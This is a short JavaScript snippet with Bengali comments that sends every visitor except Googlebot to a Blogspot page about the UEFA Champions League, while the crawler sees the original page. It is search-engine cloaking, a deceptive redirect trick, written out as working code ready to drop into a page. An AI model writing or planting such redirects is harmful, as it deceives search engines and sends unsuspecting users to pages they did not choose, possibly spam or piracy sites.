if (!navigator.userAgent.includes('Googlebot')) {
  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
  window.location.href = "https://antsportstvus.blogspot.com/2026/09/uefa-champions-league.html";
} else {
  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
  console.log("Thanks for visiting my page" );
}
